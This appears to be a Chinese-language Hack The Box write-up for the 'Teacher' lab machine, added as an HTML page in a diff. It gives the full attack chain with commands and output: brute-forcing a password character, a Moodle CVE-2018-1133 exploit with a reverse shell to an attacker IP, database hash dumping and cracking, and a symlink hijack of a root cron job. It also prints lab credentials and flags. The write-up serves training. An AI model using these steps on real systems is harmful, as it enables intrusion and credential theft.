@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Teacher — 完整攻略</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Noto Sans SC','Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">👨‍🏫</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='teacher'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-tc','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}if(sessionStorage.getItem('htb-auth-tc')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — 完整攻略</div><h1><span>Teacher</span></h1><div class="hero-meta"><span>OS <strong>Linux</strong></span><span>难度 <strong>Easy</strong></span><span>端口 <strong>80</strong></span><span>作者 <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">异常文件泄露密码 → Burp 爆破末字符 → Moodle Evil Teacher RCE</span><span class="chain-arrow">→</span><span class="chain-node blue">MySQL 备份用户 MD5 → 密码复用</span><span class="chain-arrow">→</span><span class="chain-node red">符号链接劫持 cron 备份 → root</span></div></div>
+
+<main class="content">
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>信息收集</h2></div>
+
+<h3>Nmap</h3>
+<pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.50.169</span>
+<span class="output">PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span></code></pre>
+
+<h3>目录枚举</h3>
+<pre><code><span class="cmd">$ gobuster dir -u http://10.129.50.169 \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x php,html,txt --exclude-length 178</span>
+<span class="output">/images      (Status: 301)
+<span class="highlight">/moodle</span>      (Status: 301)
+/phpmyadmin  (Status: 403)</span></code></pre>
+
+<h3>异常小文件暴露密码提示</h3>
+<p>浏览 <code>/images/</code> 目录列表时，发现 <code>5.png</code> 的大小只有 <strong>200 字节</strong>——远小于其他图片（4-9KB）。下载下来发现其实是文本文件：</p>
+<pre><code><span class="cmd">$ wget http://10.129.50.169/images/5.png</span>
+<span class="cmd">$ cat 5.png</span>
+<span class="output">Hi Servicedesk,
+
+I forgot the last charachter of my password.
+The only part I remembered is <span class="highlight">Th4C00lTheacha</span>.
+
+Could you guys figure out what the last charachter is,
+or just reset it?
+
+Thanks,
+Giovanni</span></code></pre>
+
+<div class="callout callout-key">
+<span class="callout-label">🧒 儿童版 — 200 字节的"图片"不是图片</span>
+有人把密码求助信伪装成图片放在了网站上。但这张"图片"只有 200 字节，明显不对劲。下载下来一看，原来是 Giovanni 给客服写的信，说自己忘了密码的最后一个字符。
+</div>
+
+<h3>Burp Intruder 爆破最后一个字符</h3>
+<p>用 Burp Suite Intruder 的 Sniper 模式，对密码最后一个字符进行遍历（a-z, 0-9, 特殊字符）：</p>
+<pre><code><span class="cmd">POST /moodle/login/index.php</span>
+<span class="output">anchor=&username=giovanni&password=Th4C00lTheacha<span class="highlight">§x§</span></span></code></pre>
+
+<p>55 个请求中，只有 <code>#</code> 返回了不同的响应长度（303 跳转，Length 1030）——其他都是 200（登录失败）。</p>
+<pre><code><span class="output">凭据：<span class="highlight">giovanni:Th4C00lTheacha#</span></span></code></pre>
+
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>立足点：Moodle CVE-2018-1133（Evil Teacher）</h2></div>
+
+<div class="callout callout-key">
+<span class="callout-label">🧒 儿童版 — 考试题里藏 eval() 后门</span>
+Moodle 的"测验"功能允许教师创建数学公式题——系统会用 <code>eval()</code> 函数来计算公式的结果。但 <code>eval()</code> 不检查输入内容，教师可以在"公式"里写入任意 PHP 代码让服务器执行。这就是为什么这个漏洞叫 "Evil Teacher"——邪恶的老师在考试题里藏了后门。
+</div>
+
+<h3>使用 exploit 脚本</h3>
+<pre><code><span class="cmd">$ php MoodleExploit.php \
+  url=http://teacher.htb/moodle/ \
+  user=giovanni pass=Th4C00lTheacha# \
+  ip=10.10.15.65 port=4443 course=2</span>
+
+<span class="comment"># 监听</span>
+<span class="cmd">$ nc -lvnp 4443</span>
+<span class="output">www-data@teacher:/$</span></code></pre>
+
+<h3>升级 shell</h3>
+<pre><code><span class="cmd">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
+<span class="comment"># Ctrl+Z</span>
+<span class="cmd">stty raw -echo; fg</span>
+<span class="cmd">export TERM=xterm</span>
+<span class="cmd">export SHELL=/bin/bash</span></code></pre>
+
+
+<div class="phase"><div class="phase-number blue">Phase 2</div><h2>横向移动：www-data → giovanni</h2></div>
+
+<h3>Moodle 配置泄露数据库密码</h3>
+<pre><code><span class="cmd">www-data@teacher:$ cat /var/www/html/moodle/config.php.save</span>
+<span class="output">$CFG->dbuser    = 'root';
+$CFG->dbpass    = '<span class="highlight">Welkom1!</span>';</span></code></pre>
+
+<h3>数据库提取用户哈希</h3>
+<pre><code><span class="cmd">$ mysql -u root -p"Welkom1!" -h 127.0.0.1 -P 3306</span>
+<span class="cmd">mysql> USE moodle;</span>
+<span class="cmd">mysql> SELECT username, password FROM mdl_user;</span>
+<span class="output">+-------------+--------------------------------------------------------------+
+| username    | password                                                     |
++-------------+--------------------------------------------------------------+
+| admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
+| giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
+| <span class="highlight">Giovannibak</span> | <span class="highlight">7a860966115182402ed06375cf0a22af</span>                             |
++-------------+--------------------------------------------------------------+</span></code></pre>
+
+<div class="callout callout-why">
+<span class="callout-label">为什么只破备份账户？</span>
+正式的 <code>giovanni</code> 用 bcrypt（<code>$2y$</code>），破解代价极高。但 <code>Giovannibak</code> 只用了 MD5（32 位十六进制），在线查询秒出结果：<strong>expelled</strong>。
+</div>
+
+<h3>密码复用 → su giovanni</h3>
+<pre><code><span class="cmd">www-data@teacher:$ su giovanni</span>
+<span class="output">Password: expelled</span>
+
+<span class="cmd">giovanni@teacher:~$ cat user.txt</span>
+<span class="output">ce177300e75c72c561830db3435c46d4</span></code></pre>
+
+<div class="callout callout-key">
+<span class="callout-label">🧒 儿童版 — 备份账户用弱加密</span>
+数据库里有两个 giovanni 账户：一个正式的（bcrypt 加密，很难破），一个备份的"Giovannibak"（只用了 MD5，秒破）。备份账户的密码 <code>expelled</code> 也是系统密码——密码复用又立功了。
+</div>
+
+
+<div class="phase"><div class="phase-number red">Phase 3</div><h2>权限提升：符号链接劫持 cron 备份</h2></div>
+
+<h3>pspy 发现 cron 任务</h3>
+<pre><code><span class="cmd">giovanni@teacher:$ /tmp/pspy64</span>
+<span class="output">CMD: UID=0  | tar -czvf tmp/backup_courses.tar.gz courses/algebra
+CMD: UID=0  | tar -xf backup_courses.tar.gz</span></code></pre>
+
+<h3>分析备份脚本</h3>
+<pre><code><span class="cmd">$ cat /usr/bin/backup.sh</span>
+<span class="output">#!/bin/bash
+cd /home/giovanni/work;
+tar -czvf tmp/backup_courses.tar.gz courses/*;
+cd tmp;
+tar -xf backup_courses.tar.gz;
+<span class="important">chmod 777 * -R;</span></span></code></pre>
+
+<div class="callout callout-why">
+<span class="callout-label">攻击面分析</span>
+脚本以 <strong>root</strong> 身份运行，在 <code>~/work/</code> 目录下操作。它把 <code>courses/</code> 目录打包，然后解压到 <code>tmp/</code> 并 <code>chmod 777</code>。如果我们把 <code>courses</code> 替换成指向 <code>/root</code> 的符号链接，root 就会把自己的家目录打包 → 解压到我们能看到的地方 → 还贴心地给 777 权限。
+</div>
+
+<div class="callout callout-key">
+<span class="callout-label">🧒 儿童版 — 把快捷方式指向 /root</span>
+root 有个定时任务：每分钟把 <code>courses</code> 文件夹打包备份。如果我们把 <code>courses</code> 替换成一个<strong>指向 /root 的快捷方式</strong>（符号链接），root 就会把自己的家目录打包进去，然后解压到我们能看到的地方，还贴心地给了 777 权限！
+</div>
+
+<h3>执行符号链接攻击</h3>
+<pre><code><span class="cmd">giovanni@teacher:~$ cd ~/work</span>
+<span class="cmd">giovanni@teacher:~/work$ mv courses courses_bck</span>
+<span class="cmd">giovanni@teacher:~/work$ ln -s /root courses</span>
+
+<span class="comment"># 等待约1分钟，cron 执行后...</span>
+<span class="cmd">giovanni@teacher:~/work/tmp/courses$ cat root.txt</span>
+<span class="output">dba3f43f7f428e1fd2c7b129ea8ef178</span></code></pre>
+
+<div class="callout callout-warn">
+<span class="callout-label">为什么 PATH 劫持不行？</span>
+修改 <code>PATH</code> 环境变量只影响当前用户的会话，不会影响 root 的 cron 进程。cron 有自己独立的环境变量，默认使用系统路径。
+</div>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">附录</div><h2>知识点总结</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>文件大小异常 = 必须检查。</strong><p>目录列表里看到一个文件的大小明显不同（如图片只有 200 字节），一定要下载检查。可能是伪装成图片的文本文件，里面藏着密码提示或其他敏感信息。</p></div>
+<div class="takeaway-item"><strong>Burp Intruder 单字符爆破效率极高。</strong><p>已知密码大部分内容、只差几个字符时，用 Sniper 模式逐个尝试。55 个请求就能覆盖所有可打印字符，看响应长度差异即可定位。</p></div>
+<div class="takeaway-item"><strong>Moodle Evil Teacher（CVE-2018-1133）。</strong><p>Moodle 测验功能的数学公式用 <code>eval()</code> 计算。教师角色可以在公式里注入任意 PHP 代码。只要拿到教师账号就能 RCE。</p></div>
+<div class="takeaway-item"><strong>数据库里永远检查所有用户。</strong><p>正式账户可能用 bcrypt，但备份账户可能用弱哈希（MD5）。备份账户的密码经常也是系统密码——密码复用是横向移动的常见路径。</p></div>
+<div class="takeaway-item"><strong>cron + 符号链接是经典组合。</strong><p>当 root 的 cron 任务在用户可控目录下操作时，用符号链接替换目标目录可以让 root 操作你指定的任意路径。注意：PATH 劫持不影响 cron，因为 cron 有独立的环境变量。</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">密码提示 + Burp 爆破</span><span class="arrow">→</span><span class="node node-green">Moodle Evil Teacher RCE</span><span class="arrow">→</span><span class="node node-blue">MySQL MD5 + 密码复用</span><span class="arrow">→</span><span class="node node-red">符号链接劫持 cron → root</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Teacher Writeup · 2026</footer>
+</body></html>
